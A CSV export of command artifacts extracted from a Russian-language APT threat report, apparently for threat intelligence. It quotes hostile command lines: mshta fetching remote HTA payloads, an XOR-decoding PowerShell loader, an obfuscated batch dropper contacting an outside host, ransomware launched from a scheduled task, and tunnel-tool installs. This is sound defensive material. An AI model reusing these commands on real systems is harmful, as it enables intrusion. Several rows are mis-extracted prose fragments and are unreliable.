schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--anonymous,artifact--sha256:bb3f5fc13ec8d956d5fc78937f85f37add4c6f34d347220be5edea14bac49025,observation--sha256:6c88319a722c759f5e350703e677a2447d866d10ca002300b6635ed98e254bea,command,-> cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word,-> cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 216}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"$SerialNumber = (Get - WmiObject - Query ""select * from win32_logicaldisk where DeviceID='$env:SystemDrive'"").VolumeSerialNumber; ... [byte[]] $new_bytes = new - object byte[] $response.Length; for ($i = 0; $i - lt $response.count; $i++) { $new_bytes[$i] = $response[$i] - bxor $SerialNumber[$i % $SerialNumber. Length] c:\programdata\ntuser64.exe -s -i -accepteula 1 powershell.exe /c 'mshta.exe http://....' ............ <HTA:APPLICATION icon=""#"" WINDOWSTATE=""minimize"" SHOWINTASKBAR=""no"" SYSMENU=""",
1.0.0,actor--anonymous,artifact--sha256:f4b43ec28add6faebe91dc526f1b86ef332449f60fc95278292105b5fed5ef99,observation--sha256:39150ce5f06ee7fa6cfea9a9a1202a6413cefc2d5d40722e04fa44acd3b1d6a4,command,-> mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta,-> mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 220}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,wmiprvse.exe -secured -Embedding -> cmd.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<w ord>.hta wsmprovhost.exe -> mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w ord>/<word>.hta T1021.006 Windows Remote Manageme,
1.0.0,actor--anonymous,artifact--sha256:8c79c152055170758f2d1e9d74f1a83bf575811776ddd1efe4f9e694d8604a01,observation--sha256:83fd195174de07cd8ea068dc84b1f2b90c46eede9b5d8eede8791621278fa662,command,-> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w,-> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 216}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"$SerialNumber = (Get - WmiObject - Query ""select * from win32_logicaldisk where DeviceID='$env:SystemDrive'"").VolumeSerialNumber; ... [byte[]] $new_bytes = new - object byte[] $response.Length; for ($i = 0; $i - lt $response.count; $i++) { $new_bytes[$i] = $response[$i] - bxor $SerialNumber[$i % $SerialNumber. Length] c:\programdata\ntuser64.exe -s -i -accepteula 1 powershell.exe /c 'mshta.exe http://....' ............ <HTA:APPLICATION icon=""#"" WINDOWSTATE=""minimize"" SHOWINTASKBAR=""no"" SYSMENU=""",
1.0.0,actor--anonymous,artifact--sha256:8c79c152055170758f2d1e9d74f1a83bf575811776ddd1efe4f9e694d8604a01,observation--sha256:fbe80439ce9547a1c24ebab8820aed3a796d38baae07cf30c384c6979b1c9933,command,-> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w,-> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 220}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,wmiprvse.exe -secured -Embedding -> cmd.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<w ord>.hta wsmprovhost.exe -> mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> cmd.exe /Q /c powershell.exe mshta.exe https://<domain>.com/<word>/<word>/<word>/<word>/<word>.hta wmiprvse.exe -secured -Embedding -> powershell.exe /C mshta.exe https://<domain>.com/<word>/<word>/<word>/<w ord>/<word>.hta T1021.006 Windows Remote Manageme,
1.0.0,actor--anonymous,artifact--sha256:6d6a5c1f1dbaa5ebd3a17aef16aee720e3747b13fd8b993d76799567f8ea8845,observation--sha256:c703efcabcbb3a08a25897e3daa882343427353c1cea837ca5b074c604c27c16,command,// Вместо калькулятора запускаем PowerShell-команду,// Вместо калькулятора запускаем PowerShell-команду,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 162}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1059.001 Command and Scripting Interpreter: PowerShell В ходе анализа зараженных хостов было выявлено множество событий запуска PowerShell для проведения разведки. Почти во всех случаях наблюдалась установка кодировки консоли в UTF-8 с помощью конструкции: T1059.003 Command and Scripting Interpreter: Windows Command Shell В рамках постэксплуатационной активности на зараженных хостах было зафиксировано выполнение команд через cmd.exe, направленных на разведку файловой структуры и запуск дополнит",
1.0.0,actor--anonymous,artifact--sha256:86d500d6fa785cfbde3ca81f52cb04dcaa5e13581033bcc1aafe239277ac3a8d,observation--sha256:7ded53da7c69bd4e186b8e835dc99e53c68485fe861aa982cf28cf5842fde3ff,command,"1 — исполняемый файл, легитимная утилита CURL;","1 — исполняемый файл, легитимная утилита CURL",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 172}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"В декабре 2024 года мы обнаружили очередную атаку Librarian Likho. Нам удалось получить один имплант из этой атаки. Мы изучили этот имплант и выяснили, что он является самораспаковывающимся архивом, созданным при помощи Smart Install Maker, что означает, что содержимое может быть легко извлечено. После распаковки архива мы получили три файла: • data.cab — CAB-файл, содержащий все значимые файлы импланта; • installer.config — конфигурационный файл инсталлятора, содержит команды, которые должны бы",
1.0.0,actor--anonymous,artifact--sha256:8f6fff6e61dd9a8920c1a4fb6d2e952700cdde5775265fa273c4146aab3cf930,observation--sha256:023a8fdd40ad3c5c5688cb66fa7bc8c5df3d6f7e1037f067b4fd97ea1490a2cd,command,2 T1059.001 PowerShell,2 T1059.001 PowerShell,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 308}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Портрет атакующего Execution Persistence 1 T1059.003 Windows Command Shell TWELVE, C.A.S., Head Mare, BlackJack, Awaken Likho, Angry Likho, Crypt Ghouls, Librarian Likho, BO Team, GOFFEE, XDSpy, Cyberpartisans, Mythic Likho (13) • применяется в качестве batch-скриптов для запуска ВПО, очистки логов, отключения средств защиты; • cmd.exe часто используется при удаленном выполнении команд 2 T1059.001 PowerShell TWELVE, C.A.S., Head Mare, Cloud Atlas, BlackJack, Crypt Ghouls, BO Team, Cyberpartisans",
1.0.0,actor--anonymous,artifact--sha256:1f9a5d9d35eb13e5cef412cab283d03b774cddcc6092c7a1957795301cf5d84d,observation--sha256:4ef0209ee1b7740ae8f5028968faa9b3c7ddcf864aae0e2e95cd123a7a59c879,command,4. Запускает утилиту schtasks для создания задачи планировщика “ ShutdownAt5AM” для завершения,4. Запускает утилиту schtasks для создания задачи планировщика “ ShutdownAt5AM” для завершения,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 174}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Входящий в комплект ранее рассмотренного импланта rezet.cmd (генерируется в процессе работы импланта) выполняет следующие действия: 1. Загружает дополнительные файлы, используемые в атаке, с вредоносного ресурса ( downdown[.] ru), на котором они хранятся с расширением “ .jpg” (driver.exe, blat.exe, svchost.exe, trays.rar, wol.ps1 и dc.exe); 2. Распаковывает Trays.rar при помощи пароля ( limpid2903392) и кастомизированной версии rar. exe (driver.exe), помещая извлеченные файлы в папку “ c:\Intel”",
1.0.0,actor--anonymous,artifact--sha256:05d266468cd661046d7db557bf09628d91c70abbefd0653cc2b2ac94289d96f4,observation--sha256:38f9b69529887de57f6c753ab6066788060541230726e491cfd115f819eeef2f,command,"5. Удаляет три файла: утилиту curl, rar-архив, содержащий ПО “ 4t Tray Minimizer” и инсталлятор","5. Удаляет три файла: утилиту curl, rar-архив, содержащий ПО “ 4t Tray Minimizer” и инсталлятор",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 174}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Входящий в комплект ранее рассмотренного импланта rezet.cmd (генерируется в процессе работы импланта) выполняет следующие действия: 1. Загружает дополнительные файлы, используемые в атаке, с вредоносного ресурса ( downdown[.] ru), на котором они хранятся с расширением “ .jpg” (driver.exe, blat.exe, svchost.exe, trays.rar, wol.ps1 и dc.exe); 2. Распаковывает Trays.rar при помощи пароля ( limpid2903392) и кастомизированной версии rar. exe (driver.exe), помещая извлеченные файлы в папку “ c:\Intel”",
1.0.0,actor--anonymous,artifact--sha256:485ec6557f264c8974687c0efc88fab7ac2594400f170ffe8adcc798cff79796,observation--sha256:14cd92f1d9c270ed67620ef85d79d3f8493356fad3e06ac0870485db90df15e1,command,"7DEABAF428D0}:Actions, `powershell.exe","7DEABAF428D0}:Actions, `powershell.exe",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Расследование связей между группировками и эволюция угрозы Имя задачи Командная строка Описание Dead1 reg:\\REGISTRY\MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Schedule\ TaskCache\Tasks\{9042DCD8-1F89-4FC4-8B13- 4D3D5F3AED03}:Actions, `cmd.exe` /c c:\ programdata\twelve.exe -pass [PASS] Запуск шифровальщика через командную строку с передачей пароля в качестве аргумента Dead2 reg:\\REGISTRY\MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Schedule\ TaskCache\Tasks\{AB35C377-2AD2-4",
1.0.0,actor--anonymous,artifact--sha256:0925a4325b598696751eeb813dece212b1834ab7bf5ef155e218524846095dc4,observation--sha256:773d31c95ef9fbdd4859e3fca20197c0bb1bdfcd9d2d367b7c541cae9be8e4ec,command,@for /f %%i in ('wmic useraccount where name^='%USERNAME%' get sid ^| find,@for /f %%i in ('wmic useraccount where name^='%USERNAME%' get sid ^| find,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 129}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1047 Windows Management Instrumentation Awaken Likho иногда использует WMI для сбора информации о системе: @for /f %%i in ('wmic useraccount where name^='%USERNAME%' get sid ^| find ""S-1""') do set TnxExJxOxixOxEx9=%%i schtasks /create /tn %T5vCvpv2vRvbvDv8v5vgvQvgvPvevmvH%.%CfL7LdLnLzL4L2L- ZLKLlLgLXLfLhLwLB%_M /tr ""%HOMEDRIVE%%HOMEPATH%\AppData\Local\Temp\7-ZipS- fx.000\%T5vCvpv2vRvbvDv8v5vgvQvgvPvevmvH%.%CfL7LdLnLzL4L2LZLKLlLgLXLfLhL- wLB% -%RQFSFsF2FLF1F6FkFqF8FVFmFjFmFRFU%%BosRsOswsksPs9sGs",
1.0.0,actor--anonymous,artifact--sha256:0925a4325b598696751eeb813dece212b1834ab7bf5ef155e218524846095dc4,observation--sha256:59c887f04b30f4f176616e638affa2f01e07941db38aa66ede783e0b0bbabbfc,command,@for /f %%i in ('wmic useraccount where name^='%USERNAME%' get sid ^| find,@for /f %%i in ('wmic useraccount where name^='%USERNAME%' get sid ^| find,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 133}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"@echo off setlocal enabledelayedexpansion set PzFpF1F1FjFKFpFU=%RANDOM% @for /f %%i in ('wmic useraccount where name^='%USERNAME%' get sid ^| find ""S-1""') do set TnxExJxOxixOxEx9=%%i set sDKVKFKlKZK8KWKn=technec.org set lJkKkDk5kkkLkwkx=svchosst set GzI7IGIpIrIZInIk=8080 set pKPRPmPyP7PkPpPn=connect copy /y ""IGz7zKzHzKzwzjzE.ini"" ""%lJkKkDk5kkkLkwkx%.exe"" taskkill /f /im %lJkKkDk5kkkLkwkx%.exe start """" ""%CD%\%lJkKkDk5kkkLkwkx%.exe"" timeout /t 10 start """" ""%CD%\%lJkKkDk5kkkLkwkx%.exe"" -autore%pKPR",
1.0.0,actor--anonymous,artifact--sha256:c11b1d8050cc728441e177f72d391f30f0419739e7ecc86a5b89500f0c611acd,observation--sha256:6e4244ff799a625bfb81261f6fb32994217ab5aca5b9c692d048d1c1081452b1,command,APT реализована при помощи пакетных командных файлов и PowerShell-скриптов.,APT реализована при помощи пакетных командных файлов и PowerShell-скриптов,candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 170}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Librarian Likho Описание группировки Librarian Likho (ex. Librarian Ghouls), также известная как Rare Werewolf или Rezet, — это APT -группа, которая находится на нашем постоянном мониторинге. Мы регулярно публикуем отчеты о деятельности этой группы, и, согласно данным нашей телеметрии, на момент написания этого отчета, значимых перерывов в ее активности мы не наблюдали. Злоумышленники постоянно совершают атаки на организации в России. Важная особенность данной APT-группы заключается в том, что а",
1.0.0,actor--anonymous,artifact--sha256:d67c2fd6bc77a558a69ba5c2ee365e78ae71ec8515144218b96b032d19045656,observation--sha256:6f949a4308583682c656befc347357f58c761461caf4d389edf8153d0790eed0,command,"Actions"" = ""powershell.exe out-file -inputobject (7zr.exe a c:\programdata\","Actions"" = ""powershell.exe out-file -inputobject (7zr.exe a c:\programdata\",candidate,,unknown,unknown,not-stated,,source--anonymous--736b2a933c5f6a45,Anonymous/RussiaUkrainewar/Report_Notes_of_Cyber_inspector_.pdf,"{""page"": 75}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"T1543.003 Windows Service Для закрепления Crypt Ghouls установили localtonet в качестве службы Windows. Чтобы создать службу, атакующие использовали утилиту NSSM, которую можно скачать с сайта localtonet, что атакующие и сделали: Установка localtonet через NSSM: Persistence hxxp://localtonet[.]com/nssm-2.24.zip hxxp://localtonet[.]com/download/localtonet-win-64.zip C:\Windows\Temp\nssm-2.24\win64\nssm.exe install L2_SVC C:\Windows\Temp\ localtonet.exe authtoken [redacted] C:\Windows\Temp\nssm-2.",
